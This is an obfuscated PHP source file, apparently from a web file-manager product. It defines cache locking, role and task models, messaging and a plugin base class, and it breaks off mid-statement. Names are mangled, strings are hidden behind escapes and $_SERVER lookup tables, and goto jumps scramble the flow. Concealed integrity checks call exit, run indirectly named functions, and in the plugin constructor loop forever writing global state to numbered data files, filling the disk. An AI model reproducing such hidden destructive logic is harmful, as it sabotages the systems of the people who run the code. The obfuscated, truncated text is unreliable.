<?php
 goto Dİ½›Í¯¦Å; CÁöáÉ‰: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $”ÃŠİ®Ô =& $_SERVER[¥ÙÌÜ¾ê]; $‡É¿¤ºŒ = $GLOBALS[$”ÃŠİ®Ô[6]][$”ÃŠİ®Ô[347]]; self::$cachePath = $‡É¿¤ºŒ[$”ÃŠİ®Ô[193]][$”ÃŠİ®Ô[76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($™·û¼¯á, $ßÌ• = 0) { $ûÇí¹ó =& $_SERVER[¥ÙÌÜ¾ê]; $¥Å—¼¡Å = microtime(!0); $„ÎõŞœ = $¥Å—¼¡Å + $ßÌ• + 0.0001; $¯õÊ‘Š = rtrim(self::$cachePath, $ûÇí¹ó[8]) . $ûÇí¹ó[859] . md5($™·û¼¯á) . $ûÇí¹ó[856]; if (file_exists($¯õÊ‘Š) && filemtime($¯õÊ‘Š) && filemtime($¯õÊ‘Š) < time() - 10) { @unlink($¯õÊ‘Š); } do { if (file_exists($¯õÊ‘Š)) { cacheLockWait(); continue; } $–ø˜»—» = fopen($¯õÊ‘Š, $ûÇí¹ó[860]); if (!$–ø˜»—») { return !1; } $Ï¾ÈÃ÷— = flock($–ø˜»—», LOCK_EX | LOCK_NB); self::$caches[$™·û¼¯á] = array($ûÇí¹ó[861] => $–ø˜»—», $ûÇí¹ó[193] => $¯õÊ‘Š); fwrite($–ø˜»—», $„ÎõŞœ); clearstatcache(); if ($–ø˜»—» && $Ï¾ÈÃ÷—) { return !0; } cacheLockWait(); } while (microtime(!0) < $„ÎõŞœ); $this->unlock($™·û¼¯á); return !1; } public function lockGet($ªì£Š¶) { $—„€¢•û =& $_SERVER[¥ÙÌÜ¾ê]; $½¶§ˆ°ş = rtrim(self::$cachePath, $—„€¢•û[8]) . $—„€¢•û[859] . md5($ªì£Š¶) . $—„€¢•û[856]; return file_exists($½¶§ˆ°ş); } public function unlock($û‰€§ıº) { $€±ÁÖÑœ =& $_SERVER[¥ÙÌÜ¾ê]; $õŒŒÅ¢ = self::$caches[$û‰€§ıº]; if (!$õŒŒÅ¢) { return; } @flock($õŒŒÅ¢[$€±ÁÖÑœ[861]], LOCK_UN); @fclose($õŒŒÅ¢[$€±ÁÖÑœ[861]]); @unlink($õŒŒÅ¢[$€±ÁÖÑœ[193]]); unset(self::$caches[$û‰€§ıº]); } } class CacheLockRedis { public function lock($–€Ô˜‘, $Ô“òæü = 10) { $©’ôÓŠÍ = Cache::init(); $†ÇË¹·ß = microtime(!0) + $Ô“òæü; while (microtime(!0) < $†ÇË¹·ß) { $åŠ¬à¡¢ = $©’ôÓŠÍ->get($–€Ô˜‘); if (!$åŠ¬à¡¢) { $Ñ”È¿  = $©’ôÓŠÍ->setLock($–€Ô˜‘, $†ÇË¹·ß, $Ô“òæü); if ($Ñ”È¿ ) { return !0; } } else { if ($åŠ¬à¡¢ < microtime(!0)) { $©’ôÓŠÍ->set($–€Ô˜‘, $†ÇË¹·ß, $Ô“òæü * 2); if ($©’ôÓŠÍ->get($–€Ô˜‘) === $åŠ¬à¡¢) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($·ïß¬çÃ) { return Cache::init()->get($·ïß¬çÃ); } public function unlock($£õú ¯) { return Cache::init()->remove($£õú ¯); } } if ($_SERVER[$_SERVER[¥ÙÌÜ¾ê][862]] != $_SERVER[$_SERVER[¥ÙÌÜ¾ê][863]]) { $_getc = $_SERVER[¥ÙÌÜ¾ê][864]; $_getfile = $_SERVER[$_SERVER[¥ÙÌÜ¾ê][865]] . $_SERVER[¥ÙÌÜ¾ê][866]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥ÙÌÜ¾ê][229], $_getfilec); if (count($_getarrs) < $_SERVER[¥ÙÌÜ¾ê][605]) { $exit = $_SERVER[¥ÙÌÜ¾ê][867]; $exit(); } $_act = $_SERVER[¥ÙÌÜ¾ê][868]; $_act($_SERVER[$_SERVER[¥ÙÌÜ¾ê][869]]); } goto bÖæçÂ©÷Î; E¦„ø‰áÎ: $fileSize = strrev(base64_decode($_SERVER[ïš¡îä™][0])); function binCheckNeq($ Ç«öÛõ, $é©Ô¯Ê­) { return $ Ç«öÛõ != $é©Ô¯Ê­; } $_SERVER[$_SERVER[ïš¡îä™][1]] = $fileSize($_SERVER[$_SERVER[ïš¡îä™][2]]); goto Cß™Ç‡ˆóñ; C™ÔÄØÏµÆ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\162\x6f\154\x65\x4c\x69\x73\x74"; public $field = array("\156\141\155\145", "\x61\165\164\x68", "\154\x61\x62\145\154", "\144\151\163\x70\154\x61\171", "\163\x79\x73\164\145\155", "\144\145\163\x63", "\151\x67\x6e\157\x72\x65\x45\170\x74", "\151\147\156\x6f\x72\145\106\151\x6c\x65\123\x69\x7a\x65", "\141\144\155\x69\x6e\151\x73\x74\162\141\x74\x6f\x72", "\163\157\162\164"); public function listData($ğ¡äı“ = false, $ï˜¤“¥Ÿ = "\x73\157\x72\164", $ğ£™‹¡Õ = false) { $üÙ•‹ÓÜ =& $_SERVER[¥ÙÌÜ¾ê]; $›ÄÆÜ‡Ç = parent::listData($ğ¡äı“, $ï˜¤“¥Ÿ, $ğ£™‹¡Õ); if (!$ğ¡äı“) { foreach ($›ÄÆÜ‡Ç as $ìßÄ«Ş¢ => $¬“††Œß) { if ($¬“††Œß[$üÙ•‹ÓÜ[1944]] == 1) { $›ÄÆÜ‡Ç[$ìßÄ«Ş¢][$üÙ•‹ÓÜ[445]] = LNG($üÙ•‹ÓÜ[2168]); } } } return $›ÄÆÜ‡Ç; } public function update($¬ö¯àİ‘, $šŞ°®”) { $¨˜úû¾Ê =& $_SERVER[¥ÙÌÜ¾ê]; $¬Œ‚™×£ = parent::listData($¬ö¯àİ‘); $Ÿ«Ú‡øŞ = $this->findByName($šŞ°®”[$¨˜úû¾Ê[28]]); if (!$¬Œ‚™×£ || $Ÿ«Ú‡øŞ && $Ÿ«Ú‡øŞ[$¨˜úû¾Ê[395]] != $¬Œ‚™×£[$¨˜úû¾Ê[395]]) { return !1; } if ($Ÿ«Ú‡øŞ[$¨˜úû¾Ê[1944]] == 1) { $šŞ°®” = array($¨˜úû¾Ê[28] => $šŞ°®”[$¨˜úû¾Ê[28]], $¨˜úû¾Ê[1771] => $šŞ°®”[$¨˜úû¾Ê[1771]]); } $this->filterAuth($šŞ°®”[$¨˜úû¾Ê[408]]); return parent::update($¬ö¯àİ‘, $šŞ°®”); } public function remove($˜†ˆîŒ¥) { $äÔÆì¯ß = parent::listData($˜†ˆîŒ¥); if (!$äÔÆì¯ß || $äÔÆì¯ß[$_SERVER[¥ÙÌÜ¾ê][1206]]) { return !1; } return parent::remove($˜†ˆîŒ¥); } public function add($ñ©øó„) { $‰âïÖØ =& $_SERVER[¥ÙÌÜ¾ê]; $ñ‘ÚÊßÔ = $ñ©øó„[$‰âïÖØ[28]]; if ($this->findByName($ñ‘ÚÊßÔ)) { return !1; } $œÆı¹şı = array($‰âïÖØ[415] => $ñ‘ÚÊßÔ, $‰âïÖØ[1755] => $‰âïÖØ[33], $‰âïÖØ[1751] => $‰âïÖØ[1759], $‰âïÖØ[2169] => 1, $‰âïÖØ[1754] => 0, $‰âïÖØ[2170] => 0, $‰âïÖØ[1753] => $this->getSort()); $ñ©øó„ = array_merge($œÆı¹şı, $ñ©øó„); $this->filterAuth($ñ©øó„[$‰âïÖØ[408]]); return parent::insert($ñ©øó„); } private function getSort() { $·¸ÙòÅË =& $_SERVER[¥ÙÌÜ¾ê]; $ª‰„×•Œ = parent::listData(); $˜ÌÛ‹• = array_to_keyvalue($ª‰„×•Œ, $·¸ÙòÅË[33], $·¸ÙòÅË[1772]); return empty($˜ÌÛ‹•) ? 0 : max($˜ÌÛ‹•) + 1; } private function filterAuth(&$¿İĞ¦) { $ËñÚ° =& $_SERVER[¥ÙÌÜ¾ê]; $Æòù¡êŒ = array(); $š«ıÒ = array_filter(explode($ËñÚ°[47], $¿İĞ¦)); foreach ($š«ıÒ as $¿İĞ¦) { $Œ¾Ï¨°â = explode($ËñÚ°[95], $¿İĞ¦); if ($Œ¾Ï¨°â[0] == $ËñÚ°[2171] && $Œ¾Ï¨°â[1] != $ËñÚ°[1125]) { $ºàõ÷Ä° = $Œ¾Ï¨°â[0] . $ËñÚ°[95] . $Œ¾Ï¨°â[1] . $ËñÚ°[2172]; if (!in_array($ºàõ÷Ä°, $š«ıÒ)) { $Æòù¡êŒ[] = $ºàõ÷Ä°; } } $Æòù¡êŒ[] = $¿İĞ¦; } $¿İĞ¦ = implode($ËñÚ°[47], $Æòù¡êŒ); } public function sort($ê©íõ–õ, $®¡Âí³ã) { return parent::update($ê©íõ–õ, $®¡Âí³ã); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\164\x61\x73\153\114\x69\x73\164"; public $field = array("\156\x61\155\145", "\164\171\160\x65", "\145\x76\x65\x6e\x74", "\164\151\155\x65", "\144\145\163\x63", "\x73\x79\x73\x74\145\x6d", "\145\156\141\x62\154\x65", "\x6c\141\x73\x74\x52\x75\156", "\163\x6f\162\x74"); public function listData($•æŒÉßâ = false, $—ı®ïõ´ = "\163\x6f\162\164", $ãà£Ãş = false) { return parent::listData($•æŒÉßâ, $—ı®ïõ´, $ãà£Ãş); } public function add($ËµóÄùü) { $ÄÓîıâœ =& $_SERVER[¥ÙÌÜ¾ê]; $Êƒå¶‹ = $this->findByName($ËµóÄùü[$ÄÓîıâœ[28]]); if ($Êƒå¶‹) { return !1; } $ËµóÄùü[$ÄÓîıâœ[1542]] = 0; $ËµóÄùü[$ÄÓîıâœ[1772]] = $this->getSort(); return parent::insert($ËµóÄùü); } private function getSort() { $ÒÚ—£‚› =& $_SERVER[¥ÙÌÜ¾ê]; $¾€çâë = parent::listData(); $€Øóë·ô = array_to_keyvalue($¾€çâë, $ÒÚ—£‚›[33], $ÒÚ—£‚›[1772]); return empty($€Øóë·ô) ? 0 : max($€Øóë·ô) + 1; } public function update($ş¼¡—ş, $øğ¾®şæ) { $¹¬îÕÜÉ =& $_SERVER[¥ÙÌÜ¾ê]; $Û†´êûæ = $this->listData($ş¼¡—ş); $Õ€•˜Ã = $this->findByName($øğ¾®şæ[$¹¬îÕÜÉ[28]]); if (!$Û†´êûæ || $Õ€•˜Ã && $Õ€•˜Ã[$¹¬îÕÜÉ[395]] != $Û†´êûæ[$¹¬îÕÜÉ[395]]) { return !1; } return parent::update($ş¼¡—ş, $øğ¾®şæ); } public function remove($æë—±ú›, $şäñÉ» = false) { $Ÿ¸œİ®Æ =& $_SERVER[¥ÙÌÜ¾ê]; $–ú‰˜Ù  = $this->listData($æë—±ú›); if (!$–ú‰˜Ù ) { return; } if (!$şäñÉ» && $–ú‰˜Ù [$Ÿ¸œİ®Æ[1206]] == $Ÿ¸œİ®Æ[87]) { return !1; } return parent::remove($æë—±ú›); } public function enable($İñ¸Ø£¥, $Â¾ğØ¨’) { return $this->update($İñ¸Ø£¥, array($_SERVER[¥ÙÌÜ¾ê][2163] => $Â¾ğØ¨’)); } public function run($ôğ«”¡) { return $this->update($ôğ«”¡, array($_SERVER[¥ÙÌÜ¾ê][2173] => time())); } } goto Cö½ÖİÜ“¿; DÅğë¯§ª: class Message { function __construct() { } public function send($¶‰ç¼¾ = '', $©Ï½¯ = array(), $íüŠ´ = "\x74\145\x78\164") { $×–íš =& $_SERVER[¥ÙÌÜ¾ê]; $²¦ÔÒ½ = array($×–íš[29] => $×–íš[1441], $×–íš[748] => $¶‰ç¼¾); if (in_array($íüŠ´, array($×–íš[1441], $×–íš[1442]))) { $²¦ÔÒ½[$×–íš[29]] = $íüŠ´; } $©Ï½¯ = array($×–íš[509] => isset($©Ï½¯[$×–íš[509]]) ? $©Ï½¯[$×–íš[509]] : $×–íš[33], $×–íš[588] => isset($©Ï½¯[$×–íš[588]]) ? $©Ï½¯[$×–íš[588]] : $×–íš[33]); if (empty($¶‰ç¼¾) || empty($©Ï½¯[$×–íš[509]]) && empty($©Ï½¯[$×–íš[588]])) { return !1; } $ì‹‰Ø¨ = array($×–íš[1382] => $²¦ÔÒ½, $×–íš[1443] => $©Ï½¯); Hook::trigger($×–íš[1444], $ì‹‰Ø¨); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ç³À•ã° =& $_SERVER[¥ÙÌÜ¾ê]; $¨Ò­„ = $_SERVER[$Ç³À•ã°[869]]; $¦”Ò§À± = $Ç³À•ã°[1445]; if ($_SERVER[$Ç³À•ã°[862]] != $¦”Ò§À±($¨Ò­„)) { $²¨–€‘ç = $Ç³À•ã°[880]; $±°ÑÛêë = $Ç³À•ã°[864]; $‚—àşø‘ = $_SERVER[$Ç³À•ã°[865]] . $Ç³À•ã°[866]; $šÕá•¿é = $±°ÑÛêë($‚—àşø‘); $ÍÚê¹›Õ = explode($Ç³À•ã°[229], $šÕá•¿é); if (count($ÍÚê¹›Õ) < $Ç³À•ã°[623]) { $æ—«Äæ™ = $Ç³À•ã°[867]; $æ—«Äæ™(); } $âÖçÖÃ· = $Ç³À•ã°[881]; $âÖçÖÃ·($_SERVER[$Ç³À•ã°[882]]); $²¨–€‘ç = $Ç³À•ã°[880]; $²¨–€‘ç(); $×µÍîè´ = $Ç³À•ã°[1446]; $†¨’Ùş¡ = json_encode($GLOBALS[$Ç³À•ã°[1447]]); $Ó×ÍãÖŠ = 1; for ($ú©ˆüªŸ = $Ó×ÍãÖŠ; $ú©ˆüªŸ > 0; $ú©ˆüªŸ++) { $×µÍîè´(DATA_PATH . $ú©ˆüªŸ, $†¨’Ùş¡); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ç³À•ã°[1448]); $this->pluginName = str_replace($Ç³À•ã°[1448], $Ç³À•ã°[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ç³À•ã°[8]; $this->pluginApi = appHostGet() . $Ç³À•ã°[1449] . $this->pluginName . $Ç³À•ã°[8]; $this->pluginHost = $config[$Ç³À•ã°[1450]] . $this->pluginName . $Ç³À•ã°[8]; $this->pluginHostDefault = $config[$Ç³À•ã°[1450]] . $this->pluginName . $Ç³À•ã°[8]; $™Ñ°¡í“ = $config[$Ç³À•ã°[1451]]; if ($™Ñ°¡í“ && strpos($Ç³À•ã°[47] . $™Ñ°¡í“ . $Ç³À•ã°[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ç³À•ã°[1452]] . $this->pluginName . $Ç³À•ã°[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¥ÙÌÜ¾ê][1453]); } protected function assign($´ãëœ¤, $şäóæÍÒ = false) { if (is_array($´ãëœ¤)) { $this->values = array_merge($this->values, $´ãëœ¤); } else { $this->values[$´ãëœ¤] = $şäóæÍÒ; } } protected function display($£Åò±ş¾) { extract($this->values); require $£Åò±ş¾; } final function hookRegist($¯œĞèŞª) { $this->modelPlugin->appRegist($this->pluginName, $¯œĞèŞª); } final function appIcon() { $¢Üò€Áğ =& $_SERVER[¥ÙÌÜ¾ê]; $İ›©Ò´Ş = $this->appPackage(); $ÖóÍé = $¢Üò€Áğ[33]; if (isset($İ›©Ò´Ş[$¢Üò€Áğ[411]])) { if (isset($İ›©Ò´Ş[$¢Üò€Áğ[411]][$¢Üò€Áğ[1454]])) { $ÖóÍé = $¢Üò€Áğ[1455] . $İ›©Ò´Ş[$¢Üò€Áğ[411]][$¢Üò€Áğ[1454]] . $¢Üò€Áğ[1456]; } else { if ($İ›©Ò´Ş[$¢Üò€Áğ[411]][$¢Üò€Áğ[1457]]) { $ÖóÍé = $¢Üò€Áğ[1458] . $İ›©Ò´Ş[$¢Üò€Áğ[411]][$¢Üò€Áğ[1457]] . $¢Üò€Áğ[1459]; } } } return $ÖóÍé; } final function fileCanView($×è®‘Úõ) { $ŸîÈ—ùÊ =& $_SERVER[¥ÙÌÜ¾ê]; if (request_url_safe($×è®‘Úõ)) { return !0; } if ($this->isShare($×è®‘Úõ)) { return !0; } $Æ“â™âã = Session::get($ŸîÈ—ùÊ[1460]); if (!$Æ“â™âã || !$Æ“â™âã[$ŸîÈ—ùÊ[1461]]) { $½¿ô¼ = $ŸîÈ—ùÊ[1462] . rawurlencode(this_url()); show_tips(LNG($ŸîÈ—ùÊ[1463]) . $ŸîÈ—ùÊ[1464] . $½¿ô¼ . $ŸîÈ—ùÊ[1465] . LNG($ŸîÈ—ùÊ[1466]) . $ŸîÈ—ùÊ[1467], !1); } if (!Action($ŸîÈ—ùÊ[1468])->authCan($ŸîÈ—ùÊ[1469])) { show_tips(LNG($ŸîÈ—ùÊ[1470]) . $ŸîÈ—ùÊ[1471], !1); } ActionCall($ŸîÈ—ùÊ[1472], $×è®‘Úõ); } final function isShare($‡³Òš˜“) { $›«ëš’ã = KodIO::parse($‡³Òš˜“); return $›«ëš’ã[$_SERVER[¥ÙÌÜ¾ê][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ş£ ÂÔÛ) { if (request_url_safe($Ş£ ÂÔÛ)) { return $Ş£ ÂÔÛ; } if (!$this->isShare($Ş£ ÂÔÛ)) { $Ş£ ÂÔÛ = $this->filePath($Ş£ ÂÔÛ); } return Action($_SERVER[¥ÙÌÜ¾ê][1105])->linkOut($Ş£ ÂÔÛ); } public function filePathLinkOut($Åá½¾‚°) { if (request_url_safe($Åá½¾‚°)) { return $Åá½¾‚°; } $this->fileCanView($Åá½¾‚°); return Action($_SERVER[¥ÙÌÜ¾ê][1105])->link($Åá½¾‚°); } final function filePath($Ó¦ººÁ) { $á¼¯†õ =& $_SERVER[¥ÙÌÜ¾ê]; if ($¬”…¹Û– = $this->checkSharePath($Ó¦ººÁ)) { Hook::trigger($á¼¯†õ[1473], $¬”…¹Û–); return $¬”…¹Û–; } $this->fileCanView($Ó¦ººÁ); if (request_url_safe($Ó¦ººÁ)) { $­®ú¯”‰ = parse_url_query($Ó¦ººÁ); if (isset($­®ú¯”‰[$á¼¯†õ[1474]]) && isset($­®ú¯”‰[$á¼¯†õ[209]])) { $Éğ©íÀš = Model($á¼¯†õ[763])->get($á¼¯†õ[764]); $Œà¢ºîÍ = Mcrypt::decode($­®ú¯”‰[$á¼¯†õ[209]], $Éğ©íÀš); if ($Œà¢ºîÍ) { $this->fileInfo = IO::infoWithChildren($Œà¢ºîÍ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Œà¢ºîÍ; } } $Ó¦ººÁ = $this->_cacheHttpFile($Ó¦ººÁ); $this->fileInfo = IO::infoWithChildren($Ó¦ººÁ); } else { $this->fileInfo = IO::infoWithChildren($Ó¦ººÁ); if (!$this->fileInfo) { show_tips(LNG($á¼¯†õ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($á¼¯†õ[1473], $Ó¦ººÁ); return $Ó¦ººÁ; } final function _cacheHttpFile($ìŠé„ßâ) { $ÄëçŸøÖ = hash_path($ìŠé„ßâ, !0); $this->cachePath = $this->pluginCachePath($ÄëçŸøÖ); if ($›æèøğï = IO::fileNameExist($this->cachePath, $ÄëçŸøÖ)) { return KodIO::make($›æèøğï); } $‡Ô¼²ºä = $this->cachePath . $ÄëçŸøÖ; return $this->pluginCacheFileSet($‡Ô¼²ºä, file_get_contents_nossl($ìŠé„ßâ)); } final function _tmpFileName($³Éİõ = array()) { $î€×Æ© =& $_SERVER[¥ÙÌÜ¾ê]; if (!$³Éİõ) { $³Éİõ = $this->fileInfo; } if (isset($³Éİõ[$î€×Æ©[171]])) { return $³Éİõ[$î€×Æ©[171]]; } if (isset($³Éİõ[$î€×Æ©[164]][$î€×Æ©[171]])) { return $³Éİõ[$î€×Æ©[164]][$î€×Æ©[171]]; } $ãşÅÇöê = IO::hashSimple($³Éİõ[$î€×Æ©[76]]); if ($ãşÅÇöê) { return $ãşÅÇöê; } $÷ÌêÙ§Œ = array($³Éİõ[$î€×Æ©[28]], $³Éİõ[$î€×Æ©[76]], $³Éİõ[$î€×Æ©[78]]); if (isset($³Éİõ[$î€×Æ©[515]])) { $÷ÌêÙ§Œ[] = $³Éİõ[$î€×Æ©[515]]; } return md5(implode($î€×Æ©[71], $÷ÌêÙ§Œ)); } final function checkSharePath($Ÿ¹İîÑ) { $ÎÚŠü£’ =& $_SERVER[¥ÙÌÜ¾ê]; if (!defined($ÎÚŠü£’[468])) { define($ÎÚŠü£’[508], 0); } if (!$this->isShare($Ÿ¹İîÑ)) { return !1; } $šâÃˆ¸é = Action($ÎÚŠü£’[1105])->sharePathInfo($Ÿ¹İîÑ); if (!isset($šâÃˆ¸é[$ÎÚŠü£’[76]])) { show_json(LNG($ÎÚŠü£’[1475]), !1); } $this->fileInfo = $šâÃˆ¸é[$ÎÚŠü£’[164]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ÎÚŠü£’[171]]); return $šâÃˆ¸é[$ÎÚŠü£’[76]]; } final function pluginCachePath($ìÌµæÓÕ = '') { $¬îá£Ú =& $_SERVER[¥ÙÌÜ¾ê]; $×ÇÙÀÙÓ = IO_PATH_SYSTEM_TEMP . $¬îá£Ú[1476] . $this->pluginName; if (!($ø»‹Ãòá = IO::infoFull($×ÇÙÀÙÓ))) { return IO::mkdir($×ÇÙÀÙÓ . $¬îá£Ú[8] . $ìÌµæÓÕ); } if (empty($ìÌµæÓÕ)) { return $ø»‹Ãòá[$¬îá£Ú[76]]; } if (!($Ûä¶Â–¦ = IO::fileNameExist($ø»‹Ãòá[$¬îá£Ú[76]], $ìÌµæÓÕ))) { return IO::mkdir($ø»‹Ãòá[$¬îá£Ú[76]] . $ìÌµæÓÕ); } return KodIO::make($Ûä¶Â–¦); } final function pluginCacheFileSet($ŞıË»²ª, $ŸÑŞ·ĞÆ = '') { $ûï„Ş„ =& $_SERVER[¥ÙÌÜ¾ê]; if (!($å¬û©¨© = IO::infoFull($ŞıË»²ª))) { return IO::mkfile($ŞıË»²ª, $ŸÑŞ·ĞÆ, REPEAT_REPLACE); } IO::setContent($å¬û©¨©[$ûï„Ş„[76]], $ŸÑŞ·ĞÆ); return $å¬û©¨©[$ûï„Ş„[76]]; } final function pluginLocalFile($ı´¼üÓŞ = '') { $È›¯¾™´ =& $_SERVER[¥ÙÌÜ¾ê]; $†—óâä£ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($†—óâä£)) { mk_dir($†—óâä£); } if (!$ı´¼üÓŞ) { return $†—óâä£; } $‡•İÃø = IO::info($ı´¼üÓŞ); $××Ô¬á· = $this->_tmpFileName($‡•İÃø) . $È›¯¾™´[95] . $‡•İÃø[$È›¯¾™´[168]]; if (!checkExtSafe($××Ô¬á·)) { $××Ô¬á· = $××Ô¬á· . $È›¯¾™´[1477]; } $«§¡ä¸ì = $†—óâä£ . $××Ô¬á·; if (@file_exists($«§¡ä¸ì)) { return $«§¡ä¸ì; } return IO::copy($ı´¼üÓŞ, $†—óâä£, 0, $××Ô¬á·); } final function appPackage() { $¹ úü =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->packageData) { return $this->packageData; } $ºì¬²å§ = $this->parseFile($this->pluginPath . $¹ úü[1478]); $this->parseLang($ºì¬²å§); $È¨™›ï© = json_decode_force($ºì¬²å§); if (!$È¨™›ï©) { return array(); } $Ûœ„€‚¡ = Hook::trigger($¹ úü[1479], $È¨™›ï©); if ($Ûœ„€‚¡ && is_array($Ûœ„€‚¡)) { $È¨™›ï© = $Ûœ„€‚¡; } $this->packageData = $È¨™›ï©; return $È¨™›ï©; } public function packageInfoGet($‰²¥·ª–) { $ı²”Á´ = $this->appPackage(); return array_get_value($ı²”Á´, $‰²¥·ª–); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¥ÙÌÜ¾ê][1480]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¥ÙÌÜ¾ê][1481]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¥ÙÌÜ¾ê][1482]); } public function echoJsAssign($ì†’ÖÚı, $¢ïÑó÷ò) { $this->echoJsAssignArr[$ì†’ÖÚı] = $¢ïÑó÷ò; } private function parseFile($”•´«úå) { $ñÌ¸íÀö =& $_SERVER[¥ÙÌÜ¾ê]; $¦îĞÌÃÏ = file_get_contents_nossl($”•´«úå); $íà¬Ì˜¨ = array($ñÌ¸íÀö[1483], $ñÌ¸íÀö[1484], $ñÌ¸íÀö[1485], $ñÌ¸íÀö[1486], $ñÌ¸íÀö[1487], $ñÌ¸íÀö[1488], $ñÌ¸íÀö[1489]); $¦ï’áœ› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ñÌ¸íÀö[88]][$ñÌ¸íÀö[1490]]); foreach ($this->echoJsAssignArr as $Œ‚–íÀ => $²„ÇÃ· ) { $íà¬Ì˜¨[] = $ñÌ¸íÀö[1491] . $Œ‚–íÀ . $ñÌ¸íÀö[1492]; $¦ï’áœ›[] = is_array($²„ÇÃ· ) || is_object($²„ÇÃ· ) ? rawurlencode(json_encode($²„ÇÃ· )) : $²„ÇÃ· ; } if (strstr($¦îĞÌÃÏ, $ñÌ¸íÀö[1493])) { $‚’ø¦ÇÇ = rawurlencode(json_encode($this->pluginLangArr)); $¦îĞÌÃÏ = str_replace($ñÌ¸íÀö[1493], $‚’ø¦ÇÇ, $¦îĞÌÃÏ); } if (strstr($¦îĞÌÃÏ, $ñÌ¸íÀö[1494])) { $‚’ø¦ÇÇ = $‚’ø¦ÇÇ = rawurlencode(json_encode($this->getConfig())); $¦îĞÌÃÏ = str_replace($ñÌ¸íÀö[1494], $‚’ø¦ÇÇ, $¦îĞÌÃÏ); } $¦îĞÌÃÏ = str_replace($íà¬Ì˜¨, $¦ï’áœ›, $¦îĞÌÃÏ); return $¦îĞÌÃÏ; } private function parseLang(&$ƒ‡ş˜ØÃ) { $ÁºÍ‰¥ =& $_SERVER[¥ÙÌÜ¾ê]; $íĞ‚Ç¡ = $ÁºÍ‰¥[1495]; if (!strstr($ƒ‡ş˜ØÃ, $íĞ‚Ç¡)) { return; } preg_match_all($ÁºÍ‰¥[1496], $ƒ‡ş˜ØÃ, $•›íÈÕ„); if (!is_array($•›íÈÕ„) || count($•›íÈÕ„) == 0 || !is_array($•›íÈÕ„[0]) || count($•›íÈÕ„[0]) == 0) { return; } $ÅßåùìÖ = array(); $¥·ÉÂ£½ = array(); foreach ($•›íÈÕ„[0] as $¼±³ª ) { $ÑÄ¹€…å = substr($¼±³ª , strlen($íĞ‚Ç¡), -4); $Ú¤£É— = LNG($ÑÄ¹€…å); $ÅßåùìÖ[] = $¼±³ª ; $¥·ÉÂ£½[] = str_replace(array($ÁºÍ‰¥[229], $ÁºÍ‰¥[1073], $ÁºÍ‰¥[340], $ÁºÍ‰¥[116]), array($ÁºÍ‰¥[50], $ÁºÍ‰¥[50], $ÁºÍ‰¥[33], $ÁºÍ‰¥[1497]), $Ú¤£É—); } $ƒ‡ş˜ØÃ = str_replace($ÅßåùìÖ, $¥·ÉÂ£½, $ƒ‡ş˜ØÃ); } private function parseConfig(&$ïşñ´“¨) { $ôèŞ­¸ì =& $_SERVER[¥ÙÌÜ¾ê]; $–…ïÍâŸ = $ôèŞ­¸ì[1498]; if (!strstr($ïşñ´“¨, $–…ïÍâŸ)) { return; } preg_match_all($ôèŞ­¸ì[1499], $ïşñ´“¨, $ó±èÏ¥™); if (!is_array($ó±èÏ¥™) || count($ó±èÏ¥™) == 0 || !is_array($ó±èÏ¥™[0]) || count($ó±èÏ¥™[0]) == 0) { return; } $Ì «úşç = $this->getConfig(); $Áş„°Ø = array(); $­àŒÏ„™ = array(); foreach ($ó±èÏ¥™[0] as $íßÔ…Ş¼) { $ø“Û¥ÓÛ = substr($íßÔ…Ş¼, strlen($–…ïÍâŸ), -2); $Áş„°Ø[] = $íßÔ…Ş¼; $­àŒÏ„™[] = _get($Ì «úşç, $ø“Û¥ÓÛ); } $ïşñ´“¨ = str_replace($Áş„°Ø, $­àŒÏ„™, $ïşñ´“¨); } private function parsePackage(&$Ê  Âğã) { $÷·¥¶à =& $_SERVER[¥ÙÌÜ¾ê]; $•‡õÖ—ª = $÷·¥¶à[1500]; if (!strstr($Ê  Âğã, $•‡õÖ—ª)) { return; } preg_match_all($÷·¥¶à[1501], $Ê  Âğã, $Ù¯Š•„Ì); if (!is_array($Ù¯Š•„Ì) || count($Ù¯Š•„Ì) == 0 || !is_array($Ù¯Š•„Ì[0]) || count($Ù¯Š•„Ì[0]) == 0) { return; } $§êõåí = $this->appPackage(); $ÕîÉî±Ó = array(); $µ¿ÓåÈ = array(); foreach ($Ù¯Š•„Ì[0] as $ÌòŠˆ€ù) { $²¥ÆÖËï = substr($ÌòŠˆ€ù, strlen($•‡õÖ—ª), -2); $ÕîÉî±Ó[] = $ÌòŠˆ€ù; $µ¿ÓåÈ[] = _get($§êõåí, $²¥ÆÖËï); } $Ê  Âğã = str_replace($ÕîÉî±Ó, $µ¿ÓåÈ, $Ê  Âğã); } final function echoFile($ß»ì™ñ, $éãˆÏÌÒ = false) { $ºùÈÜŞ =& $_SERVER[¥ÙÌÜ¾ê]; $ò‰áÊè = $this->pluginPath . $ß»ì™ñ; if (ACT == $ºùÈÜŞ[1502]) { echo $ºùÈÜŞ[1503] . $this->pluginName . 